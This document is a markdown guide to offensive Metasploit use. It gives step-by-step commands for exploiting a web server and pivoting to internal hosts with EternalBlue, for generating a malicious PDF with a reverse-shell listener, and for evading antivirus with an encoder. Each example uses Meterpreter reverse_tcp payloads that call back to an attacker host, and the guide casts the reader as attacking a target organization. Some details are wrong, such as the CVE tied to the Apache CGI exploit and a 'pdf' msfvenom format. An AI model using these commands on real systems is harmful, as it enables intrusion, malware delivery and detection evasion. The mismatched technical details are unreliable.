# Detailed Metasploit Examples with Code

> [!CAUTION]
> **Example 1: Exploiting a Web Server and Pivoting to an Internal Network (with Code)**
> 
> This example builds upon the multi-stage attack from the previous conversation, using a specific vulnerability and including working Metasploit commands.
> 
> **Scenario:** Let's assume your reconnaissance reveals the target organization's web server is running a vulnerable version of Apache with the 'mod\_cgi' module enabled. You plan to exploit a known vulnerability (CVE-2019-0211) that allows remote code execution.

**Steps:**

1. **Launch Metasploit and Select the Exploit:**
2. msfconsole
3. msf6 > use exploit/multi/http/apache\_mod\_cgi\_bash\_env
4. **Configure the Exploit:**
5. msf6 exploit(multi/http/apache\_mod\_cgi\_bash\_env) > set RHOSTS 10.10.10.100 # Replace with target web server IP
6. msf6 exploit(multi/http/apache\_mod\_cgi\_bash\_env) > set TARGETURI /cgi-bin/vulnerable.cgi # Replace with path to vulnerable CGI script
7. **Set the Payload:**
8. msf6 exploit(multi/http/apache\_mod\_cgi\_bash\_env) > set PAYLOAD windows/meterpreter/reverse\_tcp
9. msf6 exploit(multi/http/apache\_mod\_cgi\_bash\_env) > set LHOST 10.10.10.5 # Replace with your IP address
10. msf6 exploit(multi/http/apache\_mod\_cgi\_bash\_env) > set LPORT 4444
11. **Execute the Exploit:**
12. msf6 exploit(multi/http/apache\_mod\_cgi\_bash\_env) > exploit
13. **Pivoting (Assuming Meterpreter session established):**
14. meterpreter > route add 192.168.1.0 255.255.255.0 1 # Add a route to the internal network (replace with actual subnet)
15. meterpreter > run post/windows/gather/arp\_scanner RHOSTS 192.168.1.0/24 # Scan the internal network
16. **Internal System Exploitation (e.g., using EternalBlue):**
17. msf6 > use exploit/windows/smb/ms17\_010\_eternalblue
18. msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set RHOSTS 192.168.1.10 # Replace with target internal system IP
19. msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set PAYLOAD windows/meterpreter/reverse\_tcp
20. msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set LHOST 10.10.10.5
21. msf6 exploit(windows/smb/ms17\_010\_eternalblue) > set LPORT 4445
22. msf6 exploit(windows/smb/ms17\_010\_eternalblue) > exploit

> [!CAUTION]
> 
> **Example 2: Client-Side Attack with a Malicious PDF (with Code)**
> 
> **Scenario:** You want to exploit a vulnerability in Adobe Reader by sending a malicious PDF file.

**Steps:**

1. **Generate the Malicious PDF:**
2. msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.10.5 LPORT=4444 -f pdf > malicious.pdf
3. **Set up a Listener in Metasploit:**
4. msfconsole
5. msf6 > use exploit/multi/handler
6. msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse\_tcp
7. msf6 exploit(multi/handler) > set LHOST 10.10.10.5
8. msf6 exploit(multi/handler) > set LPORT 4444
9. msf6 exploit(multi/handler) > exploit -j # Start the listener in the background
10. **Deliver the malicious.pdf file to the target.** When the target opens the file, you should get a Meterpreter session.

> [!CAUTION]
> **Example 3: Bypassing Antivirus with Encoders (with Code)**
> 
> **Scenario:** You want to use a common exploit like ms08\_067\_netapi but need to evade antivirus detection.
> 
**Steps:**

1. **Select the Exploit:**
2. msfconsole
3. msf6 > use exploit/windows/smb/ms08\_067\_netapi
4. **Set Options and Encoder:**
5. msf6 exploit(windows/smb/ms08\_067\_netapi) > set RHOSTS 10.10.10.80 # Target IP
6. msf6 exploit(windows/smb/ms08\_067\_netapi) > set PAYLOAD windows/meterpreter/reverse\_tcp
7. msf6 exploit(windows/smb/ms08\_067\_netapi) > set LHOST 10.10.10.5
8. msf6 exploit(windows/smb/ms08\_067\_netapi) > set LPORT 4444
9. msf6 exploit(windows/smb/ms08\_067\_netapi) > set ENCODER x86/shikata\_ga\_nai # Choose an encoder
10. **Execute the Exploit:**
11. msf6 exploit(windows/smb/ms08\_067\_netapi) > exploit

> [!NOTE]
> These examples provide a more concrete understanding of how to use Metasploit by combining the conceptual explanations with actual code.
